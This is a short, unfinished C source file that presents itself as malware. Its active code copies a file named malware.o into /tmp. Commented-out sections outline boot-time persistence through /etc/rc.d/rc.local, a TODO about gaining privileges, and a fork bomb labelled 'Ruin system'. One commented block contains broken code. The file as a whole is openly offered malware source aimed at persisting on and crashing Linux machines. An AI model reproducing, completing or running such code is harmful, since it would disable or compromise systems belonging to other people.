#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
	/* Check if file does not exist */
	if ( access( "/tmp/malware.o", F_OK ) == -1 ) {
		printf( "Creating\n" );

		/* Create new file in tmp */
		FILE* f1 = fopen( "/tmp/malware.o", "ab+" );

		/* Copy this file over to new file */
		FILE* f2 = fopen( "./malware.o", "r" );
		char c = fgetc( f2 );
		while ( c != EOF ) {
			fputc( c, f1 );
			c = fgetc( f2 );
		}

		/* Close files */
		fclose( f1 );
		fclose( f2 );

		/* Set permissions on file */
/*
		char** vars;
		vars = (char**)malloc( asd * sizeof(char*) );
		vars[0] = "chmod";
		vars[1] = ""
		execvp( vars[0], vars );
		free( vars );
*/
	}

	//TODO Get adjust privileges and get program run

	/* Set up malware to run at system start */
/*
	char** vars;
	vars = (char**)malloc( 4 * sizeof(char*) );
	vars[0] = "chmod";
	vars[1] = "+x";
	vars[2] = "/etc/rc.d/rc.local";
	vars[3] = NULL;
	execvp( vars[0], vars );
	free( vars );
*/
	printf( "Done\n" );

	/* Ruin system */
	/* Create more processes */
	/*
	while ( 1 ) {
		fork();
	}
	*/

	return 0;
}
